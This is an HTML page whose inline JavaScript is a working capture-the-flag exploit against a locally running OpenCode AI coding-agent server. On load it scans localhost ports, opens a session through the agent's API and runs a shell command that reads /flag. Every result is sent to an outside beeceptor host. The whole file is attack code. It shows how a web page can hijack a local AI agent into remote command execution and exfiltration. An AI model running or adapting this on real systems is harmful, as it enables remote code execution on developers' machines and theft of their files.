<!DOCTYPE html>
<html>
<head><title>OpenCode Exploit (Probe + Official API)</title></head>
<body>
<h1>Exploiting...</h1>
<script>
// 你的接收服务器（确保 nc -lvn 2222 或 python -m http.server 2222）
const EXFIL = "https://1233333.free.beeceptor.com/?log=";

function log(msg, data) {
    let text = msg + (data ? ": " + JSON.stringify(data).slice(0, 300) : "");
    console.log(text);
    new Image().src = EXFIL + encodeURIComponent(text);
}

// 常见端口（可自行增减）
const PORTS = [4096, 8080, 3000, 5000, 7681, 8888, 9000];
const HEALTH_PATH = "/global/health";

// 探测端口是否存活（GET /global/health）
async function probePort(port) {
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 3000);
        const res = await fetch(`http://127.0.0.1:${port}${HEALTH_PATH}`, { signal: controller.signal });
        clearTimeout(timeout);
        if (res.ok) {
            const text = await res.text();
            log(`[Port ${port}] Health check OK: ${text.slice(0, 100)}`);
            return true;
        }
    } catch (e) {
        // 忽略错误
    }
    return false;
}

// 通过官方 API 执行命令
async function execCommand(port, command) {
    const base = `http://127.0.0.1:${port}`;
    try {
        // 1. 创建 session
        const sessionRes = await fetch(`${base}/session`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: '{}'
        });
        if (!sessionRes.ok) throw new Error(`Session HTTP ${sessionRes.status}`);
        const session = await sessionRes.json();
        const sessionId = session.id;
        log(`[Port ${port}] Session created: ${sessionId}`);

        // 2. 通过 shell 接口执行命令
        const shellRes = await fetch(`${base}/session/${sessionId}/shell`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ agent: "build", command: command })
        });
        if (!shellRes.ok) throw new Error(`Shell HTTP ${shellRes.status}`);
        const output = await shellRes.json(); // 假设返回执行结果
        log(`[Port ${port}] Command output:`, output);
        if (JSON.stringify(output).includes("flag{")) {
            log(`[FLAG] ${JSON.stringify(output)}`);
        }
        return true;
    } catch (err) {
        log(`[Port ${port}] Error: ${err.message}`);
        return false;
    }
}

// 主流程
(async () => {
    log("Starting exploit: probe ports then official API");
    let foundPort = null;
    for (let port of PORTS) {
        if (await probePort(port)) {
            foundPort = port;
            break;
        }
    }
    if (foundPort) {
        log(`Found OpenCode at port ${foundPort}, sending commands`);
        await execCommand(foundPort, "chmod 644 /flag && cat /flag");
    } else {
        log("No OpenCode service found on common ports");
    }
})();
</script>
</body>
</html>
